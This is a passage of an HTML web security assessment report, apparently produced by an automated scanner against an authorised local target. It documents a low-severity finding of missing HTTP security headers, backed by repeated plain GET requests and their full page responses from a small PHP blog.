+                &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+                &lt;/button&gt;
+                &lt;div class=&quot;collapse navbar-collapse justify-content-end&quot; id=&quot;navbarNavAltMarkup&quot;&gt;
+                    &lt;div class=&quot;navbar-nav&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/index.php&quot;&gt;Home&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about.php&quot;&gt;About&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/contact.php&quot;&gt;Contact&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+
+    &lt;!-- Header with Featured Post --&gt;
+    &lt;header class=&quot;py-5 bg-light border-bottom mb-4&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center my-5&quot;&gt;
+                &lt;h1 class=&quot;fw-bolder&quot;&gt;About me!&lt;/h1&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+
+    &lt;!-- Main Content Section --&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8&quot;&gt;
+                &lt;div class=&quot;container mt-5&quot;&gt;
+                    &lt;h1&gt;Meet Encoder64: Master of Digital Realms&lt;/h1&gt;
+                    &lt;p&gt;
+                        In the shadows of the digital world, there exists a figure both revered and feared. Known only as Encoder64, this enigmatic entity commands the cyber landscape with unparalleled skill. With a knack for breaking through digital barriers that seem impregnable to most, Encoder64 has shaped the contours of cyber security and ethical hacking.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;The Myth, The Legend&lt;/h2&gt;
+                    &lt;p&gt;
+                        Encoder64's journey began in the early days of internet exploration. Known for utilizing advanced encryption techniques and sophisticated algorithms, Encoder64 can infiltrate seemingly secure networks with the grace of a digital phantom. This mystic skill set not only showcases an extraordinary proficiency in programming but also an inventive approach to problem-solving in the cybernetic world.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Philosophy of a Hacker&lt;/h2&gt;
+                    &lt;p&gt;
+                        Far from the nefarious deeds often associated with hackers, Encoder64 operates under a strict code of ethics, advocating for transparency and privacy. This philosophy is driven by a belief that information should be free and that privacy is a fundamental right, not a privilege.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Techniques and Triumphs&lt;/h2&gt;
+                    &lt;p&gt;
+                        Encoder64 is a master of both offensive and defensive cyber strategies. From deploying intricate DDoS defenses to unmasking vulnerabilities in popular software, Encoder64's exploits are a testament to their deep understanding of the digital domain. Their work has prevented numerous cyber attacks, saving countless data from potential exploitation.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Legacy and Future&lt;/h2&gt;
+                    &lt;p&gt;
+                        As digital landscapes evolve, so too does the legend of Encoder64. Constantly adapting and learning, Encoder64 remains at the forefront of cybersecurity discussions, inspiring both fear and admiration. Their ongoing mission: to challenge the status quo and push the boundaries of what is possible in cybersecurity.
+                    &lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;!-- Sidebar Widgets Column --&gt;
+            &lt;div class=&quot;col-md-4&quot;&gt;
+    &lt;!-- Search Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Search&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;input-group&quot;&gt;
+                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Search for...&quot;&gt;
+                &lt;span class=&quot;input-group-append&quot;&gt;
+                    &lt;button class=&quot;btn btn-secondary&quot; type=&quot;button&quot;&gt;Go!&lt;/button&gt;
+                &lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Categories Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Categories&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Web Design&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;HTML&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Freebies&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;CSS&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Tutorials&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Side Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Live Visitors&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Current Live Visitors: &lt;span id=&quot;visitorCount&quot;&gt;0&lt;/span&gt;&lt;/h6&gt;
+            &lt;p&gt;Top Countries:&lt;/p&gt;
+            &lt;ul id=&quot;visitorCountries&quot;&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+    document.addEventListener('DOMContentLoaded', function() {
+        const countries = [&quot;Argentina&quot;, &quot;Poland&quot;, &quot;USA&quot;, &quot;Canada&quot;, &quot;Brazil&quot;, &quot;India&quot;, &quot;Germany&quot;, &quot;France&quot;, &quot;Australia&quot;, &quot;Japan&quot;, &quot;South Korea&quot;, &quot;South Africa&quot;];
+        
+        function updateVisitors() {
+            const visitorCount = Math.floor(Math.random() * 500) + 100;
+            document.getElementById('visitorCount').innerText = visitorCount;
+            const selectedCountries = [];
+            for (let i = 0; i &lt; 3; i++) {
+                const index = Math.floor(Math.random() * countries.length);
+                if (!selectedCountries.includes(countries[index])) {
+                    selectedCountries.push(countries[index]);
+                }
+            }
+            const ul = document.getElementById('visitorCountries');
+            ul.innerHTML = &quot;&quot;;
+            selectedCountries.forEach(country =&gt; {
+                const li = document.createElement('li');
+                li.innerText = country;
+                ul.appendChild(li);
+            });
+        }
+        updateVisitors();
+        setInterval(updateVisitors, 5000);
+    });
+&lt;/script&gt;        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap core JavaScript --&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyrhzur-b</code> — <code>artifacts/s-0002/ev-mqyrhzur-b/</code></div><div class="lbl">REQUEST</div><pre>GET /nonexistent_page_control.php HTTP/1.1
+Host: target.local:32844
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Mon, 29 Jun 2026 05:13:10 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32844&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyrixhw-c</code> — <code>artifacts/s-0002/ev-mqyrixhw-c/</code></div><div class="lbl">REQUEST</div><pre>GET /this_also_does_not_exist.php HTTP/1.1
+Host: target.local:32844
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Mon, 29 Jun 2026 05:13:53 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32844&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 5. [headers] Missing HTTP security headers on all responses</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32844/</div>
+<div class="desc">HTTP responses from the server only include `Content-Type`. The following security headers are absent from all tested pages: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy. The omission of X-Frame-Options / CSP frame-ancestors allows the page to be embedded in iframes (clickjacking risk). Missing X-Content-Type-Options allows MIME-type sniffing. The server runs plain HTTP so HSTS is not applicable.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32844/about.php
+2. Inspect response headers — only Content-Type is present.
+3. Repeat: same result on every request.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyrhzur-b</code> — <code>artifacts/s-0002/ev-mqyrhzur-b/</code></div><div class="lbl">REQUEST</div><pre>GET /nonexistent_page_control.php HTTP/1.1
+Host: target.local:32844
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Mon, 29 Jun 2026 05:13:10 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32844&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyrgb8t-9</code> — <code>artifacts/s-0002/ev-mqyrgb8t-9/</code></div><div class="lbl">REQUEST</div><pre>GET /about.php HTTP/1.1
+Host: target.local:32844
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 7358
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 05:11:51 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF8&quot;&gt;
+    &lt;title&gt;Encoder64 Blog | About&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Navigation Bar --&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;!-- Navbar content split into two halves with flexbox --&gt;
+        &lt;div class=&quot;d-flex justify-content-between w-100&quot;&gt;
+            &lt;!-- Left side with &quot;Encoder64 Blog&quot; --&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/index.php&quot;&gt;Encoder64 Blog&lt;/a&gt;
+
+            &lt;!-- Right side with navigation links and toggler button --&gt;
+            &lt;div&gt;
+                &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+                &lt;/button&gt;
+                &lt;div class=&quot;collapse navbar-collapse justify-content-end&quot; id=&quot;navbarNavAltMarkup&quot;&gt;
+                    &lt;div class=&quot;navbar-nav&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/index.php&quot;&gt;Home&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about.php&quot;&gt;About&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/contact.php&quot;&gt;Contact&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+
+    &lt;!-- Header with Featured Post --&gt;
+    &lt;header class=&quot;py-5 bg-light border-bottom mb-4&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center my-5&quot;&gt;
+                &lt;h1 class=&quot;fw-bolder&quot;&gt;About me!&lt;/h1&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+
+    &lt;!-- Main Content Section --&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8&quot;&gt;
+                &lt;div class=&quot;container mt-5&quot;&gt;
+                    &lt;h1&gt;Meet Encoder64: Master of Digital Realms&lt;/h1&gt;
+                    &lt;p&gt;
+                        In the shadows of the digital world, there exists a figure both revered and feared. Known only as Encoder64, this enigmatic entity commands the cyber landscape with unparalleled skill. With a knack for breaking through digital barriers that seem impregnable to most, Encoder64 has shaped the contours of cyber security and ethical hacking.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;The Myth, The Legend&lt;/h2&gt;
+                    &lt;p&gt;
+                        Encoder64's journey began in the early days of internet exploration. Known for utilizing advanced encryption techniques and sophisticated algorithms, Encoder64 can infiltrate seemingly secure networks with the grace of a digital phantom. This mystic skill set not only showcases an extraordinary proficiency in programming but also an inventive approach to problem-solving in the cybernetic world.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Philosophy of a Hacker&lt;/h2&gt;
+                    &lt;p&gt;
+                        Far from the nefarious deeds often associated with hackers, Encoder64 operates under a strict code of ethics, advocating for transparency and privacy. This philosophy is driven by a belief that information should be free and that privacy is a fundamental right, not a privilege.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Techniques and Triumphs&lt;/h2&gt;
+                    &lt;p&gt;
+                        Encoder64 is a master of both offensive and defensive cyber strategies. From deploying intricate DDoS defenses to unmasking vulnerabilities in popular software, Encoder64's exploits are a testament to their deep understanding of the digital domain. Their work has prevented numerous cyber attacks, saving countless data from potential exploitation.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Legacy and Future&lt;/h2&gt;
+                    &lt;p&gt;
+                        As digital landscapes evolve, so too does the legend of Encoder64. Constantly adapting and learning, Encoder64 remains at the forefront of cybersecurity discussions, inspiring both fear and admiration. Their ongoing mission: to challenge the status quo and push the boundaries of what is possible in cybersecurity.
+                    &lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;!-- Sidebar Widgets Column --&gt;
+            &lt;div class=&quot;col-md-4&quot;&gt;
+    &lt;!-- Search Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Search&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;input-group&quot;&gt;
+                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Search for...&quot;&gt;
+                &lt;span class=&quot;input-group-append&quot;&gt;
+                    &lt;button class=&quot;btn btn-secondary&quot; type=&quot;button&quot;&gt;Go!&lt;/button&gt;
+                &lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Categories Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Categories&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Web Design&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;HTML&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Freebies&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;CSS&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Tutorials&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Side Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Live Visitors&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Current Live Visitors: &lt;span id=&quot;visitorCount&quot;&gt;0&lt;/span&gt;&lt;/h6&gt;
+            &lt;p&gt;Top Countries:&lt;/p&gt;
+            &lt;ul id=&quot;visitorCountries&quot;&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+    document.addEventListener('DOMContentLoaded', function() {
+        const countries = [&quot;Argentina&quot;, &quot;Poland&quot;, &quot;USA&quot;, &quot;Canada&quot;, &quot;Brazil&quot;, &quot;India&quot;, &quot;Germany&quot;, &quot;France&quot;, &quot;Australia&quot;, &quot;Japan&quot;, &quot;South Korea&quot;, &quot;South Africa&quot;];
+        
+        function updateVisitors() {
+            const visitorCount = Math.floor(Math.random() * 500) + 100;
+            document.getElementById('visitorCount').innerText = visitorCount;
+            const selectedCountries = [];
+            for (let i = 0; i &lt; 3; i++) {
+                const index = Math.floor(Math.random() * countries.length);
+                if (!selectedCountries.includes(countries[index])) {
+                    selectedCountries.push(countries[index]);
+                }
+            }
+            const ul = document.getElementById('visitorCountries');
+            ul.innerHTML = &quot;&quot;;
+            selectedCountries.forEach(country =&gt; {
+                const li = document.createElement('li');
+                li.innerText = country;
+                ul.appendChild(li);
+            });
+        }
+        updateVisitors();
+        setInterval(updateVisitors, 5000);
+    });
+&lt;/script&gt;        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap core JavaScript --&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyrhzeo-a</code> — <code>artifacts/s-0002/ev-mqyrhzeo-a/</code></div><div class="lbl">REQUEST</div><pre>GET /about.php HTTP/1.1
+Host: target.local:32844
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 7358
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 05:13:09 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF8&quot;&gt;
+    &lt;title&gt;Encoder64 Blog | About&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Navigation Bar --&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;!-- Navbar content split into two halves with flexbox --&gt;
+        &lt;div class=&quot;d-flex justify-content-between w-100&quot;&gt;
+            &lt;!-- Left side with &quot;Encoder64 Blog&quot; --&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/index.php&quot;&gt;Encoder64 Blog&lt;/a&gt;
+
+            &lt;!-- Right side with navigation links and toggler button --&gt;
+            &lt;div&gt;
+                &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+                &lt;/button&gt;
+                &lt;div class=&quot;collapse navbar-collapse justify-content-end&quot; id=&quot;navbarNavAltMarkup&quot;&gt;
+                    &lt;div class=&quot;navbar-nav&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/index.php&quot;&gt;Home&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about.php&quot;&gt;About&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/contact.php&quot;&gt;Contact&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+
+    &lt;!-- Header with Featured Post --&gt;
+    &lt;header class=&quot;py-5 bg-light border-bottom mb-4&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center my-5&quot;&gt;
+                &lt;h1 class=&quot;fw-bolder&quot;&gt;About me!&lt;/h1&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+
+    &lt;!-- Main Content Section --&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8&quot;&gt;
+                &lt;div class=&quot;container mt-5&quot;&gt;
+                    &lt;h1&gt;Meet Encoder64: Master of Digital Realms&lt;/h1&gt;
+                    &lt;p&gt;
+                        In the shadows of the digital world, there exists a figure both revered and feared. Known only as Encoder64, this enigmatic entity commands the cyber landscape with unparalleled skill. With a knack for breaking through digital barriers that seem impregnable to most, Encoder64 has shaped the contours of cyber security and ethical hacking.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;The Myth, The Legend&lt;/h2&gt;
+                    &lt;p&gt;
+                        Encoder64's journey began in the early days of internet exploration. Known for utilizing advanced encryption techniques and sophisticated algorithms, Encoder64 can infiltrate seemingly secure networks with the grace of a digital phantom. This mystic skill set not only showcases an extraordinary proficiency in programming but also an inventive approach to problem-solving in the cybernetic world.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Philosophy of a Hacker&lt;/h2&gt;
+                    &lt;p&gt;
+                        Far from the nefarious deeds often associated with hackers, Encoder64 operates under a strict code of ethics, advocating for transparency and privacy. This philosophy is driven by a belief that information should be free and that privacy is a fundamental right, not a privilege.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Techniques and Triumphs&lt;/h2&gt;
+                    &lt;p&gt;
+                        Encoder64 is a master of both offensive and defensive cyber strategies. From deploying intricate DDoS defenses to unmasking vulnerabilities in popular software, Encoder64's exploits are a testament to their deep understanding of the digital domain. Their work has prevented numerous cyber attacks, saving countless data from potential exploitation.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Legacy and Future&lt;/h2&gt;
+                    &lt;p&gt;
+                        As digital landscapes evolve, so too does the legend of Encoder64. Constantly adapting and learning, Encoder64 remains at the forefront of cybersecurity discussions, inspiring both fear and admiration. Their ongoing mission: to challenge the status quo and push the boundaries of what is possible in cybersecurity.
+                    &lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;!-- Sidebar Widgets Column --&gt;
+            &lt;div class=&quot;col-md-4&quot;&gt;
+    &lt;!-- Search Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Search&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;input-group&quot;&gt;
+                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Search for...&quot;&gt;
+                &lt;span class=&quot;input-group-append&quot;&gt;
+                    &lt;button class=&quot;btn btn-secondary&quot; type=&quot;button&quot;&gt;Go!&lt;/button&gt;
+                &lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Categories Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Categories&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Web Design&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;HTML&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Freebies&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;CSS&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Tutorials&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Side Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Live Visitors&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Current Live Visitors: &lt;span id=&quot;visitorCount&quot;&gt;0&lt;/span&gt;&lt;/h6&gt;
+            &lt;p&gt;Top Countries:&lt;/p&gt;
+            &lt;ul id=&quot;visitorCountries&quot;&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+    document.addEventListener('DOMContentLoaded', function() {
+        const countries = [&quot;Argentina&quot;, &quot;Poland&quot;, &quot;USA&quot;, &quot;Canada&quot;, &quot;Brazil&quot;, &quot;India&quot;, &quot;Germany&quot;, &quot;France&quot;, &quot;Australia&quot;, &quot;Japan&quot;, &quot;South Korea&quot;, &quot;South Africa&quot;];
+        
+        function updateVisitors() {
+            const visitorCount = Math.floor(Math.random() * 500) + 100;
+            document.getElementById('visitorCount').innerText = visitorCount;
+            const selectedCountries = [];
+            for (let i = 0; i &lt; 3; i++) {
+                const index = Math.floor(Math.random() * countries.length);
+                if (!selectedCountries.includes(countries[index])) {
+                    selectedCountries.push(countries[index]);
+                }
+            }
+            const ul = document.getElementById('visitorCountries');
